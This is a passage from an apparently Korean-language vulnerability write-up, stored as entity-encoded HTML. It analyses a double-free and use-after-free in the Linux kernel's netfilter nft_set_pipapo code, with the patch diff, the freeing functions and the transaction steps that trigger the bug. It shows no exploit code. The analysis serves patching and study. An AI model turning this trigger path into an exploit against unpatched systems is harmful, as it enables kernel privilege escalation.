&#xD568;&#xC218;&#xAC00; &#xB450; &#xBC88; &#xD638;&#xCD9C;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD55C; &#xBC88;&#xC740; &#xC6D0;&#xBCF8; <code>priv-&gt;match</code> &#xAC1D;&#xCCB4;&#xC5D0; &#xB300;&#xD574;, &#xB2E4;&#xB978; &#xD55C; &#xBC88;&#xC740; &#xD074;&#xB860; <code>priv-&gt;clone</code> &#xAC1D;&#xCCB4;&#xC5D0; &#xB300;&#xD574; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xBBF8; &#xCEE4;&#xBC0B;&#xB41C; &#xC694;&#xC18C;&#xB4E4;&#xC740; &#xB450; &#xAC1D;&#xCCB4; &#xBAA8;&#xB450;&#xC5D0; &#xBDF0;(view)&#xB97C; &#xAC00;&#xC9C0;&#xBBC0;&#xB85C;, &#xC774; &#xC694;&#xC18C;&#xB4E4;&#xC5D0; &#xB300;&#xD574; <code>nf_tables_set_elem_destroy</code> &#xD568;&#xC218;&#xAC00; &#xB450; &#xBC88; &#xD638;&#xCD9C;&#xB418;&#xC5B4; &#xB3D9;&#xC77C;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;(<code>elem_priv</code>)&#xB97C; &#xB450; &#xBC88; &#xD574;&#xC81C;(kfree)&#xD558;&#xB294; Double-Free&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</li><li><strong>Use-After-Free (UAF):</strong> Double-Free&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA74;, &#xD574;&#xC81C;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;(<code>elem_priv</code>)&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD3EC;&#xC778;&#xD130;(&#xB315;&#xAE00;&#xB9C1; &#xD3EC;&#xC778;&#xD130;)&#xAC00; &#xCEE4;&#xB110; &#xB0B4; &#xB2E4;&#xB978; &#xACF3;(&#xC608;: &#xB2E4;&#xB978; &#xB137;&#xD544;&#xD130; &#xAD6C;&#xC870;&#xCCB4;, &#xC9C4;&#xD589; &#xC911;&#xC778; &#xC791;&#xC5C5;)&#xC5D0; &#xB0A8;&#xC544; &#xC788;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xC774; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xC774;&#xD6C4; &#xCF54;&#xB4DC; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xB418;&#xBA74;, &#xC774;&#xBBF8; &#xD574;&#xC81C;&#xB418;&#xC5B4; &#xB2E4;&#xB978; &#xC6A9;&#xB3C4;&#xB85C; &#xC7AC;&#xD560;&#xB2F9;&#xB418;&#xC5C8;&#xC744; &#xC218; &#xC788;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB418;&#xC5B4; &#xC608;&#xCE21; &#xBD88;&#xAC00;&#xB2A5;&#xD55C; &#xB3D9;&#xC791;&#xC774;&#xB098; &#xC2DC;&#xC2A4;&#xD15C; &#xCDA9;&#xB3CC;&#xC744; &#xC77C;&#xC73C;&#xD0B5;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC774;&#xB7EC;&#xD55C; &#xBB38;&#xC81C;&#xB294; &#xD2B9;&#xD788; &#xB137;&#xD544;&#xD130; &#xCEE4;&#xBC0B; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xACFC; <code>nft_set_pipapo</code> &#xAE30;&#xB2A5;&#xC774; &#xD1B5;&#xD569;&#xB41C; &#xC774;&#xD6C4;(commit <code>212ed75dc5fb</code>) &#xB354;&#xC6B1; &#xBCF5;&#xC7A1;&#xD574;&#xC84C;&#xC744; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC804; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xC5B4;&#xBCF4;&#xD2B8; &#xACBD;&#xB85C;&#xC5D0;&#xC11C;&#xC758; &#xC694;&#xC18C; &#xD574;&#xC81C;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; &#xCD94;&#xAC00;&#xB41C; &#xB85C;&#xC9C1;(commit <code>9827a0e6e23b</code>)&#xC774; &#xC0C8;&#xB85C;&#xC6B4; &#xCEE4;&#xBC0B; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xACFC;&#xC758; &#xC0C1;&#xD638;&#xC791;&#xC6A9; &#xC18D;&#xC5D0;&#xC11C; &#xC758;&#xB3C4;&#xCE58; &#xC54A;&#xC740; &#xBD80;&#xC791;&#xC6A9;&#xC744; &#xC77C;&#xC73C;&#xCF30;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, &#xBCF5;&#xC7A1;&#xD55C; &#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xC0C1;&#xD0DC; &#xAD00;&#xB9AC;&#xC640; &#xAC1D;&#xCCB4; &#xC0DD;&#xBA85;&#xC8FC;&#xAE30; &#xAD00;&#xB9AC; &#xB85C;&#xC9C1; &#xC0AC;&#xC774;&#xC758; &#xBBF8;&#xBB18;&#xD55C; &#xB3D9;&#xAE30;&#xD654; &#xBB38;&#xC81C; &#xB610;&#xB294; &#xC124;&#xACC4;&#xC0C1;&#xC758; &#xACB0;&#xD568;&#xC774; Double-Free/UAF&#xB85C; &#xC774;&#xC5B4;&#xC9C4; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><h2 id="&#xCDE8;&#xC57D;&#xD55C;-&#xCF54;&#xB4DC;-&#xBD84;&#xC11D;"><a href="#&#xCDE8;&#xC57D;&#xD55C;-&#xCF54;&#xB4DC;-&#xBD84;&#xC11D;" class="headerlink" title="&#xCDE8;&#xC57D;&#xD55C; &#xCF54;&#xB4DC; &#xBD84;&#xC11D;"></a>&#xCDE8;&#xC57D;&#xD55C; &#xCF54;&#xB4DC; &#xBD84;&#xC11D;</h2><pre><code class="hljs c">--- a/net/netfilter/nft_set_pipapo.c+++ b/net/netfilter/nft_set_pipapo.c@@ <span class="hljs-number">-2329</span>,<span class="hljs-number">8</span> +<span class="hljs-number">2329</span>,<span class="hljs-number">6</span> @@ <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">nft_pipapo_destroy</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct nft_ctx *ctx,</span></span><span class="hljs-function"><span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">        m = rcu_dereference_protected(priv-&gt;match, <span class="hljs-literal">true</span>);</span></span><span class="hljs-function"><span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">if</span> (m) {</span></span><span class="hljs-function"><span class="hljs-params">   rcu_barrier();</span></span><span class="hljs-function"><span class="hljs-params">-</span></span><span class="hljs-function"><span class="hljs-params">-  nft_set_pipapo_match_destroy(ctx, <span class="hljs-built_in">set</span>, m); <span class="hljs-comment">// [&#xCDE8;&#xC57D;&#xC810; &#xAD00;&#xB828; 1] priv-&gt;match&#xC5D0; &#xB300;&#xD574; &#xD638;&#xCD9C;</span></span></span><span class="hljs-function"><span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">   for_each_possible_cpu(cpu)</span></span><span class="hljs-function"><span class="hljs-params">    pipapo_free_scratch(m, cpu);</span></span><span class="hljs-function"><span class="hljs-params">@@ <span class="hljs-number">-2342</span>,<span class="hljs-number">8</span> +<span class="hljs-number">2340</span>,<span class="hljs-number">7</span> @@ <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> nft_pipapo_destroy(<span class="hljs-keyword">const</span> struct nft_ctx *ctx,</span></span><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">if</span> (priv-&gt;clone) {</span></span><span class="hljs-function"><span class="hljs-params">   m = priv-&gt;clone;</span></span><span class="hljs-function"><span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">-  <span class="hljs-keyword">if</span> (priv-&gt;dirty) <span class="hljs-comment">// [&#xCDE8;&#xC57D;&#xC810; &#xAD00;&#xB828; 2] priv-&gt;dirty &#xD50C;&#xB798;&#xADF8; &#xD655;&#xC778;</span></span></span><span class="hljs-function"><span class="hljs-params">-   nft_set_pipapo_match_destroy(ctx, <span class="hljs-built_in">set</span>, m); <span class="hljs-comment">// [&#xCDE8;&#xC57D;&#xC810; &#xAD00;&#xB828; 3] priv-&gt;clone&#xC5D0; &#xB300;&#xD574; &#xD638;&#xCD9C;</span></span></span><span class="hljs-function"><span class="hljs-params">+  nft_set_pipapo_match_destroy(ctx, <span class="hljs-built_in">set</span>, m); <span class="hljs-comment">// &#xD328;&#xCE58;&#xB41C; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; &#xC774; &#xB77C;&#xC778;&#xB9CC; &#xB0A8;&#xC74C;</span></span></span><span class="hljs-function"><span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">   for_each_possible_cpu(cpu)</span></span><span class="hljs-function"><span class="hljs-params">    pipapo_free_scratch(priv-&gt;clone, cpu);</span></span></code></pre><p>&#xC774; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; <code>priv-&gt;clone</code>&#xC774; &#xC874;&#xC7AC;&#xD558;&#xACE0; <code>priv-&gt;dirty</code> &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA74;, <code>nft_set_pipapo_match_destroy</code> &#xD568;&#xC218;&#xAC00; <code>priv-&gt;match</code>&#xC5D0; &#xB300;&#xD574; &#xD55C; &#xBC88; (&#xC81C;&#xAC70;&#xB41C; &#xB77C;&#xC778;), &#xADF8;&#xB9AC;&#xACE0; <code>priv-&gt;clone</code>&#xC5D0; &#xB300;&#xD574; &#xB610; &#xD55C; &#xBC88; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xAC83;&#xC774; Double-Free&#xC758; &#xC9C1;&#xC811;&#xC801;&#xC778; &#xC6D0;&#xC778;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">nft_set_pipapo_match_destroy</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct nft_ctx *ctx,</span></span><span class="hljs-function"><span class="hljs-params">                                         <span class="hljs-keyword">const</span> struct nft_set *<span class="hljs-built_in">set</span>,</span></span><span class="hljs-function"><span class="hljs-params">                                         struct nft_pipapo_match *m)</span></span><span class="hljs-function"></span>{    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_pipapo_field</span> *<span class="hljs-title">f</span>;</span>    <span class="hljs-keyword">int</span> i, r;    <span class="hljs-comment">// &#xB9C8;&#xC9C0;&#xB9C9; &#xD544;&#xB4DC;(field_count - 1)&#xB97C; &#xCC3E;&#xC74C;</span>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>, f = m-&gt;f; i &lt; m-&gt;field_count - <span class="hljs-number">1</span>; i++, f++)        ;    <span class="hljs-comment">// &#xB9C8;&#xC9C0;&#xB9C9; &#xD544;&#xB4DC;&#xC758; &#xBAA8;&#xB4E0; &#xADDC;&#xCE59;(rules)&#xC744; &#xC21C;&#xD68C;</span>    <span class="hljs-keyword">for</span> (r = <span class="hljs-number">0</span>; r &lt; f-&gt;rules; r++) {        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_pipapo_elem</span> *<span class="hljs-title">e</span>;</span>        <span class="hljs-comment">// &#xB3D9;&#xC77C;&#xD55C; &#xC694;&#xC18C;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC5F0;&#xC18D;&#xB41C; &#xADDC;&#xCE59;&#xC740; &#xAC74;&#xB108;&#xB700; (&#xC911;&#xBCF5; &#xCC98;&#xB9AC; &#xBC29;&#xC9C0;)</span>        <span class="hljs-keyword">if</span> (r &lt; f-&gt;rules - <span class="hljs-number">1</span> &amp;&amp; f-&gt;mt[r + <span class="hljs-number">1</span>].e == f-&gt;mt[r].e)            <span class="hljs-keyword">continue</span>;        e = f-&gt;mt[r].e; <span class="hljs-comment">// &#xC694;&#xC18C;(element) &#xD3EC;&#xC778;&#xD130; &#xAC00;&#xC838;&#xC624;&#xAE30;</span>        <span class="hljs-comment">// &#xC694;&#xC18C;&#xB97C; &#xD30C;&#xAD34;&#xD558;&#xB294; &#xD568;&#xC218; &#xD638;&#xCD9C;</span>        nf_tables_set_elem_destroy(ctx, <span class="hljs-built_in">set</span>, &amp;e-&gt;priv);    }}</code></pre><p>&#xC774; &#xD568;&#xC218;&#xB294; &#xC8FC;&#xC5B4;&#xC9C4; <code>nft_pipapo_match</code> &#xAC1D;&#xCCB4;(<code>m</code>) &#xB0B4;&#xC758; &#xC694;&#xC18C;(<code>nft_pipapo_elem</code>)&#xB4E4;&#xC744; &#xC21C;&#xD68C;&#xD558;&#xBA70;, &#xAC01; &#xC694;&#xC18C;&#xC5D0; &#xB300;&#xD574; <code>nf_tables_set_elem_destroy</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; free&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">nf_tables_set_elem_destroy</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct nft_ctx *ctx,</span></span><span class="hljs-function"><span class="hljs-params">                                <span class="hljs-keyword">const</span> struct nft_set *<span class="hljs-built_in">set</span>,</span></span><span class="hljs-function"><span class="hljs-params">                                <span class="hljs-keyword">const</span> struct nft_elem_priv *elem_priv)</span></span><span class="hljs-function"></span>{    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_set_ext</span> *<span class="hljs-title">ext</span> = <span class="hljs-title">nft_set_elem_ext</span>(<span class="hljs-title">set</span>, <span class="hljs-title">elem_priv</span>);</span>    <span class="hljs-comment">// &#xC694;&#xC18C;&#xC5D0; &#xC5F0;&#xACB0;&#xB41C; &#xD45C;&#xD604;&#xC2DD;(expressions)&#xC774; &#xC788;&#xC73C;&#xBA74; &#xD574;&#xC81C;</span>    <span class="hljs-keyword">if</span> (nft_set_ext_exists(ext, NFT_SET_EXT_EXPRESSIONS))        nft_set_elem_expr_destroy(ctx, nft_set_ext_expr(ext));    <span class="hljs-comment">// &#xC694;&#xC18C;&#xC758; private &#xB370;&#xC774;&#xD130;(elem_priv) &#xBA54;&#xBAA8;&#xB9AC; &#xD574;&#xC81C;</span>    kfree(elem_priv); <span class="hljs-comment">// *** Double-Free &#xBC1C;&#xC0DD; &#xC9C0;&#xC810; ***</span>}</code></pre><p>&#xC774; &#xD568;&#xC218;&#xB294; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; <code>kfree(elem_priv)</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC694;&#xC18C;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; free&#xD569;&#xB2C8;&#xB2E4;. <code>nft_pipapo_destroy</code>&#xC5D0;&#xC11C; <code>nft_set_pipapo_match_destroy</code>&#xAC00; &#xB450; &#xBC88; &#xD638;&#xCD9C;&#xB418;&#xBA74;, &#xB3D9;&#xC77C;&#xD55C; <code>elem_priv</code>&#xC5D0; &#xB300;&#xD574; &#xC774; <code>kfree</code>&#xAC00; &#xB450; &#xBC88; &#xC2E4;&#xD589;&#xB418;&#xC5B4; Double-Free&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>&#xAD00;&#xB828; &#xC8FC;&#xC694; &#xC790;&#xB8CC;&#xAD6C;&#xC870; &#xBC0F; &#xBCC0;&#xC218;:</strong></p><ul><li><code>struct nft_set</code>: &#xB137;&#xD544;&#xD130; &#xC9D1;&#xD569;&#xC758; &#xACF5;&#xD1B5; &#xD5E4;&#xB354; &#xAD6C;&#xC870;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;.</li><li><code>struct nft_pipapo_set</code>: PIPAPO &#xC9D1;&#xD569;&#xC758; &#xB0B4;&#xBD80; &#xC0C1;&#xD0DC; &#xAD00;&#xB9AC; &#xAD6C;&#xC870;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;. <code>match</code> (&#xD604;&#xC7AC; &#xCEE4;&#xBC0B;&#xB41C; &#xBDF0;), <code>clone</code> (&#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xC911; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC774; &#xBC18;&#xC601;&#xB418;&#xB294; &#xBDF0;), <code>dirty</code> (&#xBCC0;&#xACBD; &#xC5EC;&#xBD80; &#xD50C;&#xB798;&#xADF8;) &#xD3EC;&#xC778;&#xD130;/&#xBA64;&#xBC84;&#xB97C; &#xD3EC;&#xD568;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>struct nft_pipapo_match</code>: PIPAPO &#xC9D1;&#xD569; &#xC694;&#xC18C;&#xB4E4;&#xC758; &#xBDF0;(view)&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xAC1D;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;. <code>priv-&gt;match</code>&#xC640; <code>priv-&gt;clone</code>&#xC740; &#xC774; &#xD0C0;&#xC785;&#xC758; &#xD3EC;&#xC778;&#xD130;&#xC785;&#xB2C8;&#xB2E4;. <code>clone</code>&#xC740; &#xCEE4;&#xBC0B;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC744; &#xD3EC;&#xD568;&#xD55C; &#xBDF0;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><code>struct nft_pipapo_elem</code>: PIPAPO &#xC9D1;&#xD569;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xAC1C;&#xBCC4; &#xC694;&#xC18C;&#xC785;&#xB2C8;&#xB2E4;. <code>priv</code> &#xBA64;&#xBC84;&#xB97C; &#xD1B5;&#xD574; <code>nft_elem_priv</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xC811;&#xADFC;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>struct nft_elem_priv</code>: &#xC9D1;&#xD569; &#xC694;&#xC18C;&#xC758; private &#xB370;&#xC774;&#xD130;&#xC785;&#xB2C8;&#xB2E4;. <code>kfree</code> &#xB300;&#xC0C1;&#xC774; &#xB418;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC785;&#xB2C8;&#xB2E4;.</li><li><code>priv-&gt;dirty</code>: <code>nft_pipapo_set</code>&#xC758; &#xBA64;&#xBC84; &#xBCC0;&#xC218;&#xB85C;, &#xD604;&#xC7AC; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xC9D1;&#xD569;&#xC5D0; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC774; &#xC788;&#xC5C8;&#xB294;&#xC9C0; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xBD88;&#xB9AC;&#xC5B8;(boolean) &#xD50C;&#xB798;&#xADF8;&#xC785;&#xB2C8;&#xB2E4;. <code>nft_pipapo_insert</code> &#xB4F1;&#xC5D0;&#xC11C; <code>true</code>&#xB85C; &#xC124;&#xC815;&#xB418;&#xACE0;, <code>nft_pipapo_commit</code>&#xC5D0;&#xC11C; <code>false</code>&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xB429;&#xB2C8;&#xB2E4;.</li><li><code>set-&gt;dead</code>: <code>nft_set</code>&#xC758; &#xBA64;&#xBC84; &#xBCC0;&#xC218;&#xB85C;, &#xD574;&#xB2F9; &#xC9D1;&#xD569;&#xC774; &#xC0AD;&#xC81C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD45C;&#xC2DC;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xD50C;&#xB798;&#xADF8;&#xC785;&#xB2C8;&#xB2E4;. <code>NFT_MSG_DELSET</code> &#xB610;&#xB294; <code>NFT_MSG_DESTROYSET</code> &#xBA54;&#xC2DC;&#xC9C0; &#xCC98;&#xB9AC; &#xC2DC; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;.</li></ul><h2 id="&#xD2B8;&#xB9AC;&#xAC70;"><a href="#&#xD2B8;&#xB9AC;&#xAC70;" class="headerlink" title="&#xD2B8;&#xB9AC;&#xAC70;"></a>&#xD2B8;&#xB9AC;&#xAC70;</h2><p>&#xD2B8;&#xB9AC;&#xACE0; &#xC870;&#xAC74;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xCEE4;&#xBC0B; &#xACBD;&#xB85C;(commit path)&#xC758; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xC744; &#xD1B5;&#xD574; &#xB9CC;&#xC871;&#xB429;&#xB2C8;&#xB2E4;.</p><ol><li><p><strong><code>priv-&gt;dirty</code> &#xD50C;&#xB798;&#xADF8; &#xC124;&#xC815;:</strong> &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xB0B4;&#xC5D0;&#xC11C; <code>nft_pipapo_insert</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC9D1;&#xD569;&#xC5D0; &#xC694;&#xC18C;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xBA74;, &#xD574;&#xB2F9; &#xC9D1;&#xD569;&#xC758; <code>priv-&gt;dirty</code> &#xD50C;&#xB798;&#xADF8;&#xAC00; <code>true</code>&#xB85C; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xCEE4;&#xBC0B; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xC774; &#xC9D1;&#xD569;&#xC758; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC744; &#xBC18;&#xC601;&#xD574;&#xC57C; &#xD568;&#xC744; &#xC54C;&#xB9BD;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">nft_pipapo_insert</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct net *net, <span class="hljs-keyword">const</span> struct nft_set *<span class="hljs-built_in">set</span>,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">const</span> struct nft_set_elem *elem,</span></span><span class="hljs-function"><span class="hljs-params">        struct nft_elem_priv **elem_priv)</span></span><span class="hljs-function"></span>{[...] priv-&gt;dirty = <span class="hljs-literal">true</span>;[...]}</code></pre></li><li><p><strong><code>set-&gt;dead</code> &#xD50C;&#xB798;&#xADF8; &#xC124;&#xC815;:</strong> &#xB3D9;&#xC77C;&#xD55C; &#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xB0B4;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD574;&#xB2F9; &#xC9D1;&#xD569;&#xC744; &#xC0AD;&#xC81C;&#xD558;&#xB3C4;&#xB85D; &#xC694;&#xCCAD;(<code>NFT_MSG_DELSET</code> &#xB610;&#xB294; <code>NFT_MSG_DESTROYSET</code> &#xBA54;&#xC2DC;&#xC9C0; &#xC0AC;&#xC6A9;[1])&#xD558;&#xBA74;, <code>nf_tables_commit</code> &#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xC9D1;&#xD569;&#xC758; <code>set-&gt;dead</code> &#xD50C;&#xB798;&#xADF8;&#xAC00; <code>true</code>&#xB85C; &#xC124;&#xC815;[2]&#xB429;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">nf_tables_commit</span><span class="hljs-params">(struct net *net, struct sk_buff *skb)</span></span><span class="hljs-function"></span>{[...]  <span class="hljs-keyword">case</span> NFT_MSG_DELSET:  <span class="hljs-keyword">case</span> NFT_MSG_DESTROYSET: <span class="hljs-comment">// [1]</span>   nft_trans_set(trans)-&gt;dead = <span class="hljs-number">1</span>; <span class="hljs-comment">// [2]</span>   list_del_rcu(&amp;nft_trans_set(trans)-&gt;<span class="hljs-built_in">list</span>);   nf_tables_set_notify(&amp;trans-&gt;ctx, nft_trans_set(trans),          trans-&gt;msg_type, GFP_KERNEL);   <span class="hljs-keyword">break</span>;  <span class="hljs-keyword">case</span> NFT_MSG_NEWSETELEM: <span class="hljs-comment">// [3]</span>[...]   <span class="hljs-keyword">if</span> (te-&gt;<span class="hljs-built_in">set</span>-&gt;ops-&gt;commit &amp;&amp;       list_empty(&amp;te-&gt;<span class="hljs-built_in">set</span>-&gt;pending_update)) {    list_add_tail(&amp;te-&gt;<span class="hljs-built_in">set</span>-&gt;pending_update,           &amp;set_update_list);   }[...] } nft_set_commit_update(&amp;set_update_list);[...] nf_tables_commit_release(net); <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></li><li><p><strong><code>-&gt;commit()</code> &#xBA54;&#xC18C;&#xB4DC; &#xAC74;&#xB108;&#xB6F0;&#xAE30;:</strong> <code>nf_tables_commit</code> &#xD568;&#xC218;&#xB294; &#xC774;&#xD6C4; <code>nft_set_commit_update</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xBCC0;&#xACBD;&#xB41C; &#xC9D1;&#xD569;&#xB4E4;&#xC758; <code>-&gt;commit()</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; <code>nft_set_commit_update</code> &#xD568;&#xC218;&#xB294; <code>set-&gt;dead</code> &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xC124;&#xC815;&#xB41C; &#xC9D1;&#xD569;[4]&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB294; <code>-&gt;commit()</code> &#xBA54;&#xC18C;&#xB4DC; &#xD638;&#xCD9C;&#xC744; &#xAC74;&#xB108;&#xB701;&#xB2C8;&#xB2E4;[5]. &#xC774;&#xB294; &#xC0AD;&#xC81C;&#xB420; &#xC9D1;&#xD569;&#xC5D0; &#xB300;&#xD574; &#xBD88;&#xD544;&#xC694;&#xD55C; &#xCEE4;&#xBC0B; &#xC791;&#xC5C5;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD568;&#xC785;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">nft_set_commit_update</span><span class="hljs-params">(struct list_head *set_update_list)</span></span><span class="hljs-function"></span>{ <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_set</span> *<span class="hljs-title">set</span>, *<span class="hljs-title">next</span>;</span> list_for_each_entry_safe(<span class="hljs-built_in">set</span>, next, set_update_list, pending_update) {  list_del_init(&amp;<span class="hljs-built_in">set</span>-&gt;pending_update);  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">set</span>-&gt;ops-&gt;commit || <span class="hljs-built_in">set</span>-&gt;dead) <span class="hljs-comment">// [4]</span>   <span class="hljs-keyword">continue</span>;  <span class="hljs-built_in">set</span>-&gt;ops-&gt;commit(<span class="hljs-built_in">set</span>); <span class="hljs-comment">// [5]</span> }}</code></pre></li><li><p><strong><code>priv-&gt;dirty</code> &#xD50C;&#xB798;&#xADF8; &#xC720;&#xC9C0;:</strong> <code>nft_set_pipapo</code>&#xC758; <code>-&gt;commit()</code> &#xBA54;&#xC18C;&#xB4DC;(<code>nft_pipapo_commit</code>)&#xB294; <code>priv-&gt;dirty</code> &#xD50C;&#xB798;&#xADF8;&#xB97C; <code>false</code>&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; 3&#xB2E8;&#xACC4;&#xC5D0;&#xC11C; <code>-&gt;commit()</code> &#xBA54;&#xC18C;&#xB4DC;&#xAC00; &#xAC74;&#xB108;&#xB6F0;&#xC5B4;&#xC84C;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, <code>priv-&gt;dirty</code> &#xD50C;&#xB798;&#xADF8;&#xB294; <code>true</code> &#xC0C1;&#xD0DC;&#xB85C; &#xC720;&#xC9C0;&#xB429;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">nft_pipapo_commit</span><span class="hljs-params">(struct nft_set *<span class="hljs-built_in">set</span>)</span></span><span class="hljs-function"></span>{[...] <span class="hljs-keyword">if</span> (!priv-&gt;dirty)  <span class="hljs-keyword">return</span>;[...] priv-&gt;dirty = <span 